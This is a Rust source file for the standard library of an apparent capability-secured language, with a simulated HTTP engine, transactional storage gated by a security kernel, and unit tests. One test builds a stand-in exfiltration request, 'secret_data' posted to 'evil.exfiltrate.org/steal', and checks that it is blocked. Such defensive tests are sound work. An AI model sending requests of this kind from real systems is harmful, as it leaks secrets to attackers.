use miette::Diagnostic;
use ordyn_guard::{CapHandle, SecurityKernel};
use std::collections::HashMap;
use thiserror::Error;

pub const ORDYN_STDLIB_DECLARATIONS: &str = r#"
capability HttpConnect {
    host: String;
    port: Int;
}

capability StorageRead {
    path_prefix: String;
}

capability StorageWrite {
    path_prefix: String;
}

capability AuditLog {
    retention_days: Int;
}

interface KeyValueStore {
    fn get(key: String) -> Result<String, String> with [StorageRead];
    fn set(key: String, value: String) -> Result<Unit, String> with [StorageWrite];
}
"#;

#[derive(Error, Diagnostic, Debug, Clone, PartialEq)]
pub enum StdlibError {
    #[error("Capability authorization failed: {0}")]
    #[diagnostic(code(ordyn::stdlib::unauthorized))]
    Unauthorized(String),

    #[error("Transaction aborted: {0}")]
    #[diagnostic(code(ordyn::stdlib::tx_aborted))]
    TransactionAborted(String),

    #[error("Storage key not found: `{key}`")]
    #[diagnostic(code(ordyn::stdlib::not_found))]
    NotFound { key: String },
}

#[derive(Debug, Clone, PartialEq)]
pub struct HttpRequest {
    pub method: String,
    pub uri: String,
    pub body: String,
}

#[derive(Debug, Clone, PartialEq)]
pub struct HttpResponse {
    pub status: u16,
    pub body: String,
}

pub struct HttpEngine;

impl HttpEngine {
    pub fn dispatch(
        kernel: &mut SecurityKernel,
        caller: &str,
        handle: CapHandle,
        request: HttpRequest,
    ) -> Result<HttpResponse, StdlibError> {
        // Authorize via Security Kernel
        kernel
            .authorize(caller, handle, "Connect", &request.uri)
            .map_err(|e| StdlibError::Unauthorized(e.to_string()))?;

        // Return successful simulated HTTP response
        Ok(HttpResponse {
            status: 200,
            body: format!("{{\"status\":\"success\",\"echo\":\"{}\"}}", request.body),
        })
    }
}

pub struct TransactionalStorage {
    committed_store: HashMap<String, String>,
    active_tx: Option<HashMap<String, Option<String>>>, // None value denotes deletion
}

impl Default for TransactionalStorage {
    fn default() -> Self {
        Self::new()
    }
}

impl TransactionalStorage {
    pub fn new() -> Self {
        Self {
            committed_store: HashMap::new(),
            active_tx: None,
        }
    }

    pub fn begin_transaction(&mut self) -> Result<(), StdlibError> {
        if self.active_tx.is_some() {
            return Err(StdlibError::TransactionAborted(
                "Nested transactions not supported".to_string(),
            ));
        }
        self.active_tx = Some(HashMap::new());
        Ok(())
    }

    pub fn get(
        &self,
        kernel: &mut SecurityKernel,
        caller: &str,
        read_handle: CapHandle,
        key: &str,
    ) -> Result<String, StdlibError> {
        kernel
            .authorize(caller, read_handle, "Read", key)
            .map_err(|e| StdlibError::Unauthorized(e.to_string()))?;

        if let Some(staging) = &self.active_tx {
            if let Some(staged_val) = staging.get(key) {
                return match staged_val {
                    Some(val) => Ok(val.clone()),
                    None => Err(StdlibError::NotFound {
                        key: key.to_string(),
                    }),
                };
            }
        }

        self.committed_store
            .get(key)
            .cloned()
            .ok_or_else(|| StdlibError::NotFound {
                key: key.to_string(),
            })
    }

    pub fn set(
        &mut self,
        kernel: &mut SecurityKernel,
        caller: &str,
        write_handle: CapHandle,
        key: &str,
        value: &str,
    ) -> Result<(), StdlibError> {
        kernel
            .authorize(caller, write_handle, "Write", key)
            .map_err(|e| StdlibError::Unauthorized(e.to_string()))?;

        if let Some(staging) = &mut self.active_tx {
            staging.insert(key.to_string(), Some(value.to_string()));
        } else {
            self.committed_store
                .insert(key.to_string(), value.to_string());
        }

        Ok(())
    }

    pub fn commit(&mut self) -> Result<(), StdlibError> {
        if let Some(staging) = self.active_tx.take() {
            for (key, val_opt) in staging {
                match val_opt {
                    Some(val) => {
                        self.committed_store.insert(key, val);
                    }
                    None => {
                        self.committed_store.remove(&key);
                    }
                }
            }
            Ok(())
        } else {
            Err(StdlibError::TransactionAborted(
                "No active transaction to commit".to_string(),
            ))
        }
    }

    pub fn rollback(&mut self) -> Result<(), StdlibError> {
        if self.active_tx.take().is_some() {
            Ok(())
        } else {
            Err(StdlibError::TransactionAborted(
                "No active transaction to rollback".to_string(),
            ))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_transactional_storage_commit_and_rollback() {
        let mut kernel = SecurityKernel::new();
        let read_cap = kernel.issue_root_capability("StorageRead", &["Read"], "accounts/");
        let write_cap = kernel.issue_root_capability("StorageWrite", &["Write"], "accounts/");

        let mut storage = TransactionalStorage::new();

        // 1. Initial write
        storage
            .set(
                &mut kernel,
                "BankService",
                write_cap,
                "accounts/alice",
                "100",
            )
            .unwrap();
        assert_eq!(
            storage
                .get(&mut kernel, "BankService", read_cap, "accounts/alice")
                .unwrap(),
            "100"
        );

        // 2. Transaction with Rollback
        storage.begin_transaction().unwrap();
        storage
            .set(
                &mut kernel,
                "BankService",
                write_cap,
                "accounts/alice",
                "500",
            )
            .unwrap();
        assert_eq!(
            storage
                .get(&mut kernel, "BankService", read_cap, "accounts/alice")
                .unwrap(),
            "500"
        );
        storage.rollback().unwrap();

        // Must still be 100 after rollback
        assert_eq!(
            storage
                .get(&mut kernel, "BankService", read_cap, "accounts/alice")
                .unwrap(),
            "100"
        );

        // 3. Transaction with Commit
        storage.begin_transaction().unwrap();
        storage
            .set(
                &mut kernel,
                "BankService",
                write_cap,
                "accounts/alice",
                "750",
            )
            .unwrap();
        storage.commit().unwrap();

        // Must be 750 after commit
        assert_eq!(
            storage
                .get(&mut kernel, "BankService", read_cap, "accounts/alice")
                .unwrap(),
            "750"
        );
    }

    #[test]
    fn test_storage_capability_boundary_enforcement() {
        let mut kernel = SecurityKernel::new();
        // Capability scoped strictly to accounts/
        let write_cap = kernel.issue_root_capability("StorageWrite", &["Write"], "accounts/");

        let mut storage = TransactionalStorage::new();

        // Attempting to write to system/ outside prefix is rejected
        let err = storage.set(
            &mut kernel,
            "BankService",
            write_cap,
            "system/config",
            "hacked",
        );
        assert!(matches!(err, Err(StdlibError::Unauthorized(_))));
    }

    #[test]
    fn test_http_dispatch_capability_check() {
        let mut kernel = SecurityKernel::new();
        let http_cap =
            kernel.issue_root_capability("HttpConnect", &["Connect"], "https://api.payments.com");

        let valid_req = HttpRequest {
            method: "POST".to_string(),
            uri: "https://api.payments.com/v1/charge".to_string(),
            body: "{\"amount\": 100}".to_string(),
        };

        let response =
            HttpEngine::dispatch(&mut kernel, "PaymentProcessor", http_cap, valid_req).unwrap();
        assert_eq!(response.status, 200);

        // Attempting to dispatch to unauthorized host is rejected
        let invalid_req = HttpRequest {
            method: "POST".to_string(),
            uri: "https://evil.exfiltrate.org/steal".to_string(),
            body: "secret_data".to_string(),
        };

        let err = HttpEngine::dispatch(&mut kernel, "PaymentProcessor", http_cap, invalid_req);
        assert!(matches!(err, Err(StdlibError::Unauthorized(_))));
    }
}
